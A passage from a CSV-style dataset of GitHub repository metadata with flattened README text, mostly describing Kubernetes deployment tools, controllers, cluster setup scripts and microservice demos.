5d4ld 1 1 Running 0 45h kube system kube proxy j2q9s 1 1 Running 8 6d19h kube system kube scheduler znode47 1 1 Running 7 7d11h kube system kubernetes dashboard 7fc5b58d5f pl447 1 1 Running 79 6d19h kube system kubernetes metrics scraper 7b4b7d88cd rdtgp 1 1 Running 7 6d21h kube system nodelocaldns gkfk9 1 1 Running 7 7d11h kube system nvidia device plugin daemonset 9hgqk 1 1 Running 1 2d16h kube system rdma shared dp ds z7vnw 1 1 Running 2 5d21h kube system whereabouts qmcsn 1 1 Running 2 5d21h Working 9 Create YAML configuration file with network attachment definition for IB interface and deploy it At this point this is where we will finally assign what IP s for IBoIP you want to use So change the range section below to be your IBoIP range We recommend you first look at your ip s assigned within your IB enviroment and either use another CIDR or if you want to use your exsisitng defined network that are physically configured on your IB cards using ip a s on your system you will have to use the Exclude examples in Step 10 cd vi net ipoib0 yaml apiVersion k8s cni cncf io v1 kind NetworkAttachmentDefinition metadata annotations k8s v1 cni cncf io resourceName rdma hcashareddevicesa name ipoib rdma ib0 namespace default spec config cniVersion 0 3 1 name ipoib rdma ib0 plugins ipam datastore kubernetes kubernetes kubeconfig etc cni net d whereabouts d whereabouts kubeconfig logfile tmp whereabouts log loglevel debug range 192 168 111 0 24 type whereabouts type ipoib master ib0 kubectl apply f net ipoib0 yaml If you have certain ports configured on your IB cards then change the master ib0 above and change all of the names in the definition file Repeat to create for more cards cd vi net ipoib2 yaml apiVersion k8s cni cncf io v1 kind NetworkAttachmentDefinition metadata annotations k8s v1 cni cncf io resourceName rdma hcashareddevicesb name ipoib rdma ib2 namespace default spec config cniVersion 0 3 1 name ipoib rdma ib2 plugins ipam datastore kubernetes kubernetes kubeconfig etc cni net d whereabouts d whereabouts kubeconfig logfile tmp whereabouts log loglevel debug range 192 168 112 0 24 type whereabouts type ipoib master ib2 kubectl apply f net ipoib2 yaml Verify that the network attachments are setup properly and running sudo kubectl get network attachment definitions k8s cni cncf io NAME AGE ipoib rdma ib0 5d21h ipoib rdma ib2 5d21h macvlan conf 1 46h 10 Create an Example YAML file for Pod deployment with IB network annotation and IB resource and deploy it vi pod ipoib gpu example yaml apiVersion v1 kind Pod metadata name test pod ipoib0 annotations k8s v1 cni cncf io networks ipoib rdma ib0 spec restartPolicy OnFailure nodeSelector kubernetes io hostname node2 containers image csmykay sample docker image mlnx name test ctr ipoib0 securityContext capabilities add IPCLOCK resources limits rdma hcashareddevicesa 1 nvidia com gpu 1 requesting 1 GPU command sh c ls l dev infiniband sys class net sleep inf ADD EXCLUDES ABOVE IF YOU WANT TO,2020-09-23T01:32:51Z,2020-11-04T21:01:30Z,Dockerfile,User,1,1,0,1,master,csmykay,1,0,0,0,0,0,0
AymanMagdy,automate-k8s-gcp-the-hard-way-with-ansible,,,2020-11-23T04:49:31Z,2020-12-04T20:56:01Z,Shell,User,1,1,0,5,master,AymanMagdy,1,0,0,0,0,0,0
ShirshaDatta,WordPress-on-K8S-and-AWS-using-Terraform,aws-rds-mysql#kubernetes-cluster#minikube-setup#wordpess,WordPress on K8S and AWS using Terraform You can find a detailed article on the same here https medium com shirshadatta2000 deploy the wordpress application on kubernetes and aws using terraform c7833c11e276 USAGE To initialize with the dependencies terraform init To deploy the whole infrastructure on AWS consisting of RDS and its dependencies WordPress over Kubernetes via Minikube Expose the WordPress pod terraform apply auto approve To destroy the infrastructure use the command terraform destroy auto approve,2020-10-07T16:59:08Z,2020-10-10T15:04:35Z,HCL,User,1,1,0,7,main,ShirshaDatta,1,0,0,0,0,0,0
jrhuerta,celery-k8s-suffle-shard-with-autoscaling,,,2020-11-12T18:58:53Z,2020-11-27T18:26:45Z,Python,User,1,1,0,10,main,jrhuerta,1,0,0,0,0,0,0
xiagw,deploy.sh,docker#k8s#rsync,deploy sh for GitLab CI CD AWS docker build image PHPJavaVueDockerfile acme shssl Sonarqube Scan docker nfs Node npm yarn Node docker image image Java maven gradlejar Java docker image image PHP PHP composer PHP docker image image k8s helm TelegramElement Matrix Quick Start 1 gitlab runner register it gitlab runner 1 cd HOME 1 git clone https github com xiagw deploy sh git 1 deploy conf deploy conf 1 deploy env deploy env 1 gitlab ci yaml git 1 git push 1 gitlab xiagw gitlab docker https github com xiagw gitlab docker git docker compose 1 gitlab runnerexecuter shell 1 ssh key file gitlab runner idrsa HOME ssh deploy sh 1 gitlab runner shell cd USER gitlab runner git clone https github com xiagw deploy sh git 1 deploy conf deploy env 1 gitlab projectA root 1 projectA 1 gitlab ci yml 1 push CI CD mermain readme png mermaid graph TB Dev pull push Java Dev pull push PHP Dev pull push VUE Dev pull push Python Dev pull push other Languages Java pull push git PHP pull push git VUE pull push git Python pull push git other pull push git Ops shell git git CI deploy sh Ops shell CI UI sketch PD PD issues git GitLab Server QA issues git QA test testm Manuel tests QA test testauto Auto tests CI rsync Servers CI kubectl helm K8s CI docker Build CI sql db1 Database manage CI cert manage cert Cert manage CI notify notify Notify manage db1 sql flyway cert shell acme acme sh acme dns api dns1 dns api CF acme dns api dns2 dns api ali CI code rev Code check CI test test Test center test test testu Unit tests testu test testf Function tests testf test testl Load tests rev format Code formater format sonar Sonarqube scan Build push Repo Docker Registry Servers pub Cloud x Pub Cloud Cloud x mx VM Servers pri own Pri Cloud own my SVRS K8s pri ENVD ENV develop K8s pri ENVT ENV testing K8s pri ENVM ENV master ENVD pri appd app 1 2 3 appd pri cached redis cluster cached pri dbd mysql cluster ENVT pri appt app 1 2 3 appt pri cachet redis cluster cachet pri dbt mysql cluster ENVM pri appm app 1 2 3 appm pri cachem redis cluster cachem pri dbm mysql cluster,2020-10-14T18:39:46Z,2020-10-24T17:28:49Z,Shell,User,1,1,1,42,main,xiagw#Velik123,2,0,0,0,0,0,0
renoki-co,php-helm,k8s#kubernetes#laravel#php-helm,PHP Helm Wrapper CI https github com renoki co php helm workflows CI badge svg branch master codecov https codecov io gh renoki co php helm branch master graph badge svg https codecov io gh renoki co php helm branch master StyleCI https github styleci io repos 323445250 shield branch master https github styleci io repos 323445250 Latest Stable Version https poser pugx org renoki co php helm v stable https packagist org packages renoki co php helm Total Downloads https poser pugx org renoki co php helm downloads https packagist org packages renoki co php helm Monthly Downloads https poser pugx org renoki co php helm d monthly https packagist org packages renoki co php helm License https poser pugx org renoki co php helm license https packagist org packages renoki co php helm Min K8s Version https img shields io badge Min 20K8s 20Version v1 17 16 2B 23326ce5 Max K8s Version https img shields io badge Max 20K8s 20Version v1 19 6 23326ce5 PHP Helm is a process wrapper for Kubernetes Helm v3 You can run Helm v3 commands directly from PHP with a simple syntax The package is running on top of symfony process https symfony com doc current components process html so the API is easily accessible Supporting Renoki Co on GitHub aims on bringing a lot of open source projects and helpful projects to the world Developing and maintaining projects everyday is a harsh work and tho we love it If you are using your application in your day to day job on presentation demos hobby projects or even school projects spread some kind words about our work or sponsor our work Kind words will touch our chakras and vibe while the sponsorships will keep the open source projects alive ko fi https www ko fi com img githubbuttonsm svg https ko fi com R6R42U8CL Installation You can install the package via composer bash composer require renoki co php helm For Laravel you may Publish the config bash php artisan vendor publish provider RenokiCoPhpHelmPhpHelmServiceProvider tag config Usage php use RenokiCoPhpHelmHelm helm Helm call repo add stable https charts helm sh stable run The process is based on symfony process echo helm getOutput Flags Environment Variables You might want to pass flags to the commands php use RenokiCoPhpHelmHelm helm Helm call repo add stable https charts helm sh stable no update true A third parameter is used for envs php use RenokiCoPhpHelmHelm helm Helm call repo add stable https charts helm sh stable no update true SOMEENV 1234 Specifying Binary Path You can call it once to set the path to the binary to the helm cli php use RenokiCoPhpHelmHelm Helm setHelmPath usr bin my path helm For Laravel you might simply publish the config and set the HELMPATH env variable HELMPATH usr bin my path helm Testing bash vendor bin phpunit Contributing Please see CONTRIBUTING CONTRIBUTING md for details Security If you discover any security related issues please email alex renoki org instead of using the issue tracker Credits Alex Renoki https github com rennokki All Contributors contributors,2020-12-21T20:52:42Z,2020-12-26T09:24:41Z,PHP,Organization,1,1,0,9,master,rennokki,1,1,1,0,0,0,0
zlingqu,go-template-tool,,go yaml config k8s config srcdest main go go run main go destdiryaml,2020-11-24T08:07:01Z,2020-12-18T02:08:39Z,Go,User,1,1,0,2,master,zlingqu,1,0,0,0,0,0,1
gato,roach-on-pi,,roach on pi Scripts needed to build and deploy CockroachDB on a Raspberry PI K8s cluster code for Deploying CockroachDB on a Raspberry Pis Kubernetes cluster post https medium com marceloglezer cockroachdb on a raspberrypi kubernetes cluster 7b12a2e497e1 Now updated to version 20 2 0,2020-09-02T21:05:02Z,2020-11-12T12:37:12Z,Dockerfile,User,1,1,3,6,master,gato,1,0,0,0,1,0,0
OojaxoO,kube-websocket,,k8s vim etc profile export GO111MODULE on GOPROXY https goproxy io export GOPROXY source etc profile git clone http gitlab ccfox com ops ops push git cd ops push make make install cd opt ops push ops push,2020-10-23T02:30:10Z,2020-10-24T03:07:31Z,Go,User,1,1,0,1,master,OojaxoO,1,0,0,0,0,0,0
bbenzikry,spark-irsa,,,2020-08-23T20:55:43Z,2020-09-24T07:11:00Z,Dockerfile,User,1,1,1,1,master,bbenzikry,1,0,0,0,0,0,0
svishnevskii,deploy-kubernetes-nodejs-server,,Deploy a NodeJS Server Using Kubernetes contributions https img shields io badge contributions welcome brightgreen svg style flat square https github com svishnevskii deploy kubernetes nodejs server issues Hello today we will figure out how Kubernetes works using the example of a small web server on NodeJS This small case will help you familiarize yourself with the concept of clustering in k8s In this tutorial we ll cover 1 Building the application image 2 Pushing the image to Docker Hub Registry 3 Deploying the application in Kubernetes Environment Docker Descktop https www docker com products docker desktop with enable Kubernetes at settings You can still use Minikube https kubernetes io ru docs tasks tools install minikube 1 3 Building the application image cd src docker build t svishnevskii myapp v1 replace svishnevskii with your USERNAME from DockerHab After a successful build you can find the image in the list by calling the docker images command 2 3 Pushing the image to Docker Hub Registry Sign in DockerHub docker login Input your personal access after you ll see Login Succeeded docker push myapp v1 3 3 Deploying the application in Kubernetes cd kube Creating a Deployment A Deployment provides declarative updates for Pods and ReplicaSets Create the Deployment by running the following command kubectl apply f deployment yaml Run kubectl get deployments to check if the Deployment was created Creating a Service In Kubernetes a Service is an abstraction which defines a logical set of Pods and a policy by which to access them sometimes this pattern is called a micro service The set of Pods targeted by a Service is usually determined by a selector Create the Service kubectl apply f service yaml Run kubectl get svc to check Creating a Ingress Ingress exposes HTTP and HTTPS routes from outside the cluster to services within the cluster Traffic routing is controlled by rules defined on the Ingress resource Create the Ingress kubectl apply f ingress yaml Run kubectl get ing to check If created Ingress doesn t have value on the Address field then you should set up Nginx Ingress Controller for the Minikube environment just run minikube addons enable ingress command and check Results Docker Descktop Check URL http localhost Minikube Get external IP on your Minikube minikube ip and use his Bug Reports and Improvements If you experience any bugs or see anything that can be improved or added please feel free to open an issue https github com svishnevskii deploy kubernetes nodejs server issues here or simply contact me through any of the methods below Thanks in advance,2020-11-27T16:27:08Z,2020-12-04T13:30:29Z,JavaScript,User,1,1,0,3,master,svishnevskii#Vishnevskii,2,0,0,0,0,0,0
adecarolis,footloose-k3s,,Run k3s calico via footloose Originally seen at https github com korvus81 k8s net labs,2020-09-28T16:05:34Z,2020-10-26T02:05:40Z,Shell,User,1,1,1,3,master,adecarolis,1,0,0,0,0,0,0
grubenhund,reloader,,reloader Watches configmap changes in cluster and performs reload on containers using that configmaps with restarting Controlled by pod annotations Annotation Effect reloader yarr command Command to reload If unset reloader doesn t interact with pod reloader yarr check Command to check config before reload not necessary reloader yarr updated is set before reloading with purpose of triggering k8s control loop to update configmap inside pod For local usage run with env apiserver and kubeconfig in kube config,2020-12-17T00:10:24Z,2020-12-20T16:44:32Z,Python,User,1,1,0,1,master,grubenhund,1,0,0,0,0,0,0
GroupOneIncorporated,acme-infrastructure,ansible#docker#helm#k8s#kubernetes#openstack#packer#rke#terraform#terraglue,acme infrastructure Folders ansible The ansible playbooks that configure manage the servers configs Configuration files of use docker Files for creating the wordpress and mariadb docker images glue Terraglue script for glueing Terraform Ansible rke together kubernetes Everything for the k8s cluster packer Files for creating the server images rke config files for the installation of k8s terraform Terraform files for the provisioning of resources Files deploy all sh Provision with terraform install kubernetes with rke setup cluster and application with helm destroy all sh Destroy from helm rke terraform,2020-10-05T09:39:27Z,2020-11-04T19:45:16Z,JavaScript,Organization,1,1,0,278,main,brocahontaz#scoobis#CrazySwe#JBarroca,4,0,0,1,26,0,36
AliyunContainerService,ack-tag-tool,,ACK Tag Tool Tag all Alibaba Cloud resources used in specific ACK Kubernetes cluster Setup pip3 install r requirements txt Usage Set environment variables for AK export ACCESSKEYID xxxxxx export ACCESSKEYSECRET xxxxxx Check resource tag for specific ACK K8s cluster python3 main py clusterid xxxxxx region cn beijing key test key value test value Tag resource for specific ACK K8s cluster python3 main py clusterid xxxxxx region cn beijing key test key value test value s Untag resource for specific ACK K8s cluster python3 main py clusterid xxxxxx region cn beijing key test key s u,2020-10-02T03:50:58Z,2020-12-07T02:13:03Z,Python,Organization,4,1,0,4,main,denverdino,1,0,0,1,1,0,0
dgoodwin,syncsets,,Sync Sets Prototype for an operator like application not depending on Kubernetes CRDs or API breaking out the SyncSets functionality from OpenShift Hive Planned Architecture Simulate Kubernetes operator style applications but without actually being depending on the Kubernetes apiserver CRDs or etcd Generate restapi and Go client with go swagger from Go types code first Rest API backed by Postgres JSONB document storage Types will support some common metadata such as labels only now they will actually be indexed Watch will be provided by RabbitMQ or some AMQP bus for pub sub Hoping for very minimal bus usage with no logic Rest API publishes events to queues for each API type Establishing a watch means subscribing to a queue for an API type and if you re listening you will receive messages on API events Controllers to be horizontally scalable Leverage a second type of queue where only one listener can pickup an event Can run multiple pods and workloads will be distributed to only one as they pull work from the queue Development Install go swagger Used to generate API server go client code and documentation bash go get u github com go swagger go swagger cmd swagger Presently using code first with go swagger where types handlers have appropriate godoc annotations to generate swagger yaml from which virtually everything under client and restapi is generated Install HTTPPie Just an easier option than curl Used in some commands in this README Launch RabbitMQ This project presently aims to use RabbitMQ for pub sub consumers who wish to watch API events Using the RabbitMQ Operator https www rabbitmq com kubernetes operator operator overview html this process involves some resources I had to patch to work on OpenShift bash kubectl apply f manifests rabbitmq operator kubectl apply f manifests namespace yaml kubectl apply f manifests rabbitmq cluster yaml oc adm policy add scc to user rabbitmq cluster z rabbitmq server Once running you can check in with bash oc rsh rabbitmq server 0 rabbitmqctl clusterstatus Create a PostgreSQL Database Several options here 1 On OpenShift Use the OpenShift Template create a new project in the console select to add a database and choose postgresql Crunchy PostgreSQL operator appears much too complicated and possibly broken TODO Try EnterpriseDB PostgreSQL operator 1 On plain Kubernetes Kind Run a postgresql pod kubectl create f manifests postgresql postgresql yaml This won t work on OpenShift as the official Docker images assume root TODO Update the manifest to use the OpenShift image and have one manifest that works on both 1 Amazon RDS Choose free tier and public access Note your password and ensure you ve created a database called syncsets Establish a local port forward if running on OpenShift or Kube The POSTGRESPARAMS env var will be used both for goose schema migrations and the api server itself You should be able to connect to your local database with bash kubectl port forward svc postgresql 5432 5432 export POSTGRESPARAMS user postgres password helloworld dbname syncsets sslmode disable host localhost psql POSTGRESPARAMS Database Schema Install goose for managing database schema migrations and create or update the schema bash go get u github com pressly goose cmd goose goose postgres POSTGRESPARAMS up Testing Locally Ensure you have postgresql properly configured and reachable from localhost per above Compile your current code generate server client and run the API locally bash make run Push some data with httpie bash echo name cluster1 namespace foo kubeconfig foobar http POST localhost 7070 v1 clusters Your database should now have an entry in the clusters table bash psql POSTGRESPARAMS c select from clusters Testing In Cluster bash IMG quay io dgoodwin syncsets latest make docker push deploy,2020-11-26T18:06:15Z,2020-12-07T18:42:21Z,Go,User,3,1,1,40,main,dgoodwin,1,0,0,0,0,0,0
nikitkrsk,recepies_book,,Application for sharing recepies with option of selling yours and communication between users For this project I m using Docker Kubernetes Minikube Typescript React with Redux Express Nats Streaming Service Redis SMTP2GO To Start App You will need to get free SMTP2GO https www smtp2go com account and put your API key into infra k8s auth depl yaml minikube start minikube addons enable ingress minikube ip sudo nano etc hosts put ip from previos step as recepies dev ip skaffold dev NOTES Browser will say that website is not secured to solve this simply type in the browser thisisunsafe To get into shell of running pod kubectl get pods kubectl exec stdin tty PODNAME bin bash To Create Migration npm run typeorm cli migration create n MigrationName,2020-08-31T10:44:24Z,2020-10-29T13:50:39Z,JavaScript,User,0,1,0,32,master,nikitkrsk,1,0,0,0,0,0,0
ealebed,redins,k8s#kubernetes#kubernetes-controller#redis#redis-client,REDis INSert data controller This repository implements a simple controller for watching new created redis pod and inserting data to it Details The sample controller uses client go library https github com kubernetes client go tree master tools cache extensively Running Prerequisite Since the controller uses apps v1 deployments the Kubernetes cluster version should be greater than 1 9 sh assumes you have a working kubeconfig not required if operating in cluster go build for run on development export INCLUSTER false run with default kubeconfig path redins or provide path to kubeconfig manually redins kubeconfig HOME kube config sh run controller in cluster kubectl apply f deployment deployment yaml What happens under the hood Controller connects to a Kubernetes cluster sets up an informer for Pods in default namespace and with label selector app ads redis statistic and then starts the Informer run loop When pods with matched criteria and the initial warmup of pods when the Store syncs are added to the cluster controller initialize redis client connect to provided redis server set key value in database get and print key value from DB and finally close connection to redis server,2020-11-26T10:30:02Z,2020-12-03T16:47:40Z,Go,User,1,1,0,3,master,ealebed,1,0,0,0,0,0,0
komish,pod-suffix-injector,controller#controllers#k8s#kubernetes#openshift,PodSuffixInjector PodSuffixInjector is a controller that injects the generated suffix appended to podnames when generateName is used to determine the name of the Pod The suffix will be stored in a label pod suffix on the pod itself Controller logic is functional in cluster assets RBAC etc have not been tested The controller will currently run against all namespaces To use run the controller using make run and then create deployments with a controller reference with the label inject pod suffix true in the pod spec template Ex yaml apiVersion apps v1 kind Deployment metadata name nginx deployment labels app nginx spec replicas 3 selector matchLabels app nginx template metadata labels app nginx inject pod suffix true spec containers name nginx image nginx 1 14 2 ports containerPort 80 Any pod without this label is considered to have opted out Any pod with this label having a different value is considered to have opted out The controller makes no other changes to the pod Log output for an object that has opted out looks like the following 2020 09 25T10 54 35 003 0500 INFO controllers PodSuffixInjector pod has opted out doing nothing 2020 09 25T10 54 35 003 0500 DEBUG controller runtime controller Successfully Reconciled controller pod request default nginx deployment 6b474476c4 7bj6n 2020 09 25T10 54 35 051 0500 INFO controllers PodSuffixInjector pod has opted out doing nothing 2020 09 25T10 54 35 051 0500 DEBUG controller runtime controller Successfully Reconciled controller pod request default nginx deployment 6b474476c4 6gpkb 2020 09 25T10 54 35 924 0500 INFO controllers PodSuffixInjector pod has opted out doing nothing 2020 09 25T10 54 35 924 0500 DEBUG controller runtime controller Successfully Reconciled controller pod request default nginx deployment 6b474476c4 6gpkb 2020 09 25T10 54 36 318 0500 INFO controllers PodSuffixInjector pod has opted out doing nothing 2020 09 25T10 54 36 318 0500 DEBUG controller runtime controller Successfully Reconciled controller pod request default nginx deployment 6b474476c4 7bj6n Log output for an object that has opted in looks like the following errors here indicate that the resource has changed before the controller was able to work with it so it requeues the work 2020 09 25T10 55 26 519 0500 INFO controllers PodSuffixInjector pod has opted in 2020 09 25T10 55 26 519 0500 INFO controllers PodSuffixInjector updating object if needed 2020 09 25T10 55 26 577 0500 INFO controllers PodSuffixInjector some error updating the pod 2020 09 25T10 55 26 577 0500 ERROR controller runtime controller Reconciler error controller pod request default nginx deployment 569d6767d5 c82vh error Operation cannot be fulfilled on pods nginx deployment 569d6767d5 c82vh the object has been modified please apply your changes to the latest version and try again github com go logr zapr zapLogger Error Users dev go pkg mod github com go logr zapr v0 1 0 zapr go 128 sigs k8s io controller runtime pkg internal controller Controller reconcileHandler Users dev go pkg mod sigs k8s io controller runtime v0 5 0 pkg internal controller controller go 258 sigs k8s io controller runtime pkg internal controller Controller processNextWorkItem Users dev go pkg mod sigs k8s io controller runtime v0 5 0 pkg internal controller controller go 232 sigs k8s io controller runtime pkg internal controller Controller worker Users dev go pkg mod sigs k8s io controller runtime v0 5 0 pkg internal controller controller go 211 k8s io apimachinery pkg util wait JitterUntil func1 Users dev go pkg mod k8s io apimachinery v0 17 2 pkg util wait wait go 152 k8s io apimachinery pkg util wait JitterUntil Users dev go pkg mod k8s io apimachinery v0 17 2 pkg util wait wait go 153 k8s io apimachinery pkg util wait Until Users dev go pkg mod k8s io apimachinery v0 17 2 pkg util wait wait go 88 2020 09 25T10 55 27 578 0500 INFO controllers PodSuffixInjector pod has opted in 2020 09 25T10 55 27 578 0500 INFO controllers PodSuffixInjector updating object if needed 2020 09 25T10 55 27 636 0500 DEBUG controller runtime controller Successfully Reconciled controller pod request default nginx deployment 569d6767d5 c82vh 2020 09 25T10 55 27 678 0500 INFO controllers PodSuffixInjector pod has opted in 2020 09 25T10 55 27 678 0500 INFO controllers PodSuffixInjector updating object if needed 2020 09 25T10 55 27 734 0500 DEBUG controller runtime controller Successfully Reconciled controller pod request default nginx deployment 569d6767d5 c82vh 2020 09 25T10 55 28 915 0500 INFO controllers PodSuffixInjector pod has opted in 2020 09 25T10 55 28 915 0500 INFO controllers PodSuffixInjector updating object if needed 2020 09 25T10 55 28 969 0500 DEBUG controller runtime controller Successfully Reconciled controller pod request default nginx deployment 569d6767d5 c82vh,2020-09-25T16:00:46Z,2020-09-29T20:51:16Z,Go,User,1,1,0,4,main,komish,1,0,0,0,0,0,0
ShirshaDatta,Automating-the-deployment-of-a-containerized-app-in-K8S-using-Groovy,,Automating the deployment of a containerized app in K8S using Groovy To know how to do this read this article https medium com shirshadatta2000 automating web server deployment using groovy script 6baca1da39d2 And if you liked it please clap Thank you,2020-08-24T12:53:09Z,2020-10-10T15:06:59Z,Groovy,User,1,1,0,20,master,ShirshaDatta,1,0,0,0,0,0,0
packetcraft,K8cluster_with_kubeadm-multipass_ubuntu-18.04_K8s-1.19,,Multi Node Kubernetes 1 19 3 with kubeadm on local multipass ubuntu 18 04 cloud with Docker These simple scripts deploy a multi node Kubernetes 1 19 2 with kubeadm on multipass VMs with Docker on your local machine in about 6 minutes depending on your internet speed About Multipass https multipass run Prerequsists You need kubectl and multipass installed on your laptop Install multipass on MacOS Catalina or Linux Get the latest Multipass here https github com CanonicalLtd multipass releases Installation 3 node with docker Deploy the master node 2 worker nodes and join the worker nodes into the cluster step by step bash make the script executable chmod 755 1 deploy kubeadm master sh chmod 755 2 deploy kubeadm nodes sh chmod 755 3 kubeadmjoinnodes sh execute the script 1 deploy kubeadm master sh 2 deploy kubeadm nodes sh 3 kubeadmjoinnodes sh or deploy with a single command bash deploy sh You should get something similar to this at the end bash NAME STATUS ROLES AGE VERSION master NotReady master 5m17s v1 19 2 worker1 NotReady node 42s v1 19 2 worker2 NotReady node 34s v1 19 2 Enjoy Copy the locally created kubeconfig files to be avaibale system wide bash the kubernetes credential details are in the file kubeconfig yaml in the local folder You can use this file to run kubect commands KUBECONFIG kubeconfig yaml kubectl get nodes you can also copy the locally created kubeconfig files to be avaibale as a default context system wide cp kubeconfig yaml Users xxxxxxx kube config then you can run kubectl normally kubectl get nodes Confirm that all pods are up and running kubectl get nodes all namespaces Install MetalLB bash chmod 755 install metal lb sh install metal lb sh Confirm that all pods are up and running kubectl get nodes all namespaces Setting up Traefik bash kubectl apply f configmap yml kubectl create f traefik yaml kubectl apply f rbac yml kubectl get pods n kube system grep traefik you should see a line that looks like the following traefik ingress controller 68c5fbccbd 5kjvw 1 1 Running Troubleshooting Note we re using Calico here if 192 178 0 0 16 is already in use within your network you must select a different pod network CIDR replacing 192 178 0 0 16 in the kubeadm init command in 1 deploy kubeadm master sh script as well as in the calico yaml file provided in this repo Cleanup bash cleanup sh Blog post A related blog post which i heavily refered to https blog kubernauts io simplicity matters kubernetes 1 16 fffbf7e84944,2020-10-19T07:12:56Z,2020-10-20T11:24:23Z,Shell,User,1,1,0,26,master,packetcraft,1,0,0,0,0,0,0
packetcraft,K8cluster_with_kubeadm-multipass_ubuntu-18.04_K8s-1.17,,Multi Node Kubernetes 1 17 4 with kubeadm on local multipass ubuntu 18 04 cloud with Docker These simple scripts deploy a multi node Kubernetes 1 17 4 with kubeadm on multipass VMs with Docker on your local machine in about 6 minutes depending on your internet speed About Multipass https multipass run Prerequsists You need kubectl and multipass installed on your laptop Install multipass on MacOS Catalina or Linux Get the latest Multipass here https github com CanonicalLtd multipass releases Installation 3 node with docker Deploy the master node 2 worker nodes and join the worker nodes into the cluster step by step bash make teh script executable chmod 755 1 deploy kubeadm master sh chmod 755 2 deploy kubeadm nodes sh chmod 755 3 kubeadmjoinnodes sh execute teh script 1 deploy kubeadm master sh 2 deploy kubeadm nodes sh 3 kubeadmjoinnodes sh or deploy with a single command bash deploy sh You should get something similar to this at the end bash NAME STATUS ROLES AGE VERSION master Ready master 8m55s v1 17 0 worker1 Ready node 3m45s v1 17 0 worker2 Ready node 3m24s v1 17 0 Enjoy and learn to love learning Total runtime in minutes was 06 30 Copy the locally created kubeconfig files to be avaibale system wide bash the kubernetes credential details are in the file kubeconfig yaml in the local folder You can use this file to run kubect commands KUBECONFIG kubeconfig yaml kubectl get nodes you can also copy the locally created kubeconfig files to be avaibale as a default context system wide cp kubeconfig yaml Users xxxxxxx kube config then you can run kubectl normally kubectl get nodes Install MetalLB bash chmod 755 install metal lb sh install metal lb sh Setting up Traefik bash kubectl apply f configmap yml kubectl create f traefik yaml kubectl apply f rbac yml kubectl get pods n kube system grep traefik you should see a line that looks like the following traefik ingress controller 68c5fbccbd 5kjvw 1 1 Running Troubleshooting Note we re using Calico here if 192 178 0 0 16 is already in use within your network you must select a different pod network CIDR replacing 192 178 0 0 16 in the kubeadm init command in 1 deploy kubeadm master sh script as well as in the calico yaml file provided in this repo Cleanup bash cleanup sh Blog post A related blog post which i heavily refered to https blog kubernauts io simplicity matters kubernetes 1 16 fffbf7e84944,2020-10-14T17:16:55Z,2020-10-20T11:24:50Z,Shell,User,1,1,0,13,master,packetcraft,1,0,0,0,0,0,0
loccmodd,simple-pod-log,easy#java#k8s#log#pod#shell#simple,simple pod log K8SPOD chmod a x run sh run sh podkeyword logfilename chmod a x stop sh stop sh podkeyword V20201130 run shPodstop shPod,2020-11-30T14:09:28Z,2020-11-30T14:22:32Z,Shell,User,1,1,0,5,main,loccmodd,1,0,0,0,0,0,0
JingChaoLiang,IdentityServer,,,2020-11-26T04:06:51Z,2020-11-26T04:17:09Z,C#,User,1,1,1,2,master,JingChaoLiang,1,0,0,0,0,0,0
bhuone-garbu,ms-blog,docker#k8s#kubernetes#microservices#nodejs#react#skaffold,Bhuwan Garbuja Intro This repo contains experiments for event driven microservice design and development Tech Stack Really simple tech stack and simple code NodeJS Express React Docker Kubernetes k8s Ingress Nginx Skaffold Concepts The project attempts to build the following different microserices as proof of concept React client FE posts MS comments MS event bus MS query MS moderation MS And the following concepts are covered in this repo Micro services design and philosophy how they should behave and work EventBus and EventStorage for async operations Comparision with monolithic designs Dockerization of services Managing k8s clusters objects with kubectl K8s deployments and dev practices with Skaffold Part 2 This next part attempts to build production grade ms by utilizing third party packages when deemed necessary GH repo link https github com bhuone garbu ms ticketing,2020-10-11T17:55:09Z,2020-11-19T13:07:05Z,JavaScript,User,1,1,0,25,main,bhuone-garbu,1,0,0,0,0,0,1
mchmarny,helm-charts,chart#cluster#deployment#helm#install#k8s#kubernetes,Helm Charts by Mark Chmarny ns label operator https github com mchmarny ns label operator tree main chart Operator that applies custom deployments into namespace when it is labeled with a specific label For example create a Zipkin trace exporter when a namespace is labeled with export traces true Disclaimer This is my personal project and it does not represent my employer While I do my best to ensure that everything works I take no responsibility for issues caused by this code,2020-11-28T20:20:12Z,2020-12-04T00:59:22Z,Makefile,User,1,1,0,9,main,mchmarny,1,0,0,0,0,0,0
pedrodeoliveira,kafka-streaming-tests,faust#goka#java#k8s#kafka-streaming#kafka-streams#python,Kafka Streaming Tests,2020-09-18T15:04:31Z,2020-12-25T09:47:35Z,Python,User,1,1,0,14,master,pedrodeoliveira,1,0,0,0,0,0,0
angylada,dovecot-director-controller,controller#dovecot#dovecot-director#e-mail#k8s#kubernetes#mail,Dovecot Director Controller Dovecot director is used to keep a temporary user mail server dovecot server mapping as described in dovecot docs If a dovecot director and dovecot server are used in a kubernetes cluster mappings are not being updated in case a dovecot container restarts for example To update the new pod ip and therefore to correct the mapping a manual execution of the command doveadm reload needs to be done on the dovecot director server Since no one wants to waste manual effort on responses to ordinary container events this tool intends to automatically execute said command on the dovecot director shell whenever a dovecot container pod becomes ready Usage Runs inside and outside of a kubernetes cluster If you don t run it inside a k8s cluster it tries to load the kubeconfig in the executing users homedir If it does not exist you need to specify the absolute path with command flag c Environment variables needed for successful execution DOVECOTNAMESPACE string Namespace name which must contain both dovecot director and dovecot pods DOVECOTLABELS string All labels given to dovecot for conclusive identification of dovecot pods same format as in DOVECOTDIRECTORLABELS DOVECOTDIRECTORLABELS string All labels given to dovecot director for conclusive identification of dovecot director pods in the following format DOVECOTDIRECTORCONTAINERNAME string optional Container Name of dovecot director in Pod Defaults to first Container in Pod if not set Used Library https github com kubernetes client go,2020-10-28T16:53:58Z,2020-11-04T14:57:08Z,Go,User,1,1,1,10,main,angylada#Bobonium,2,1,1,0,0,0,4
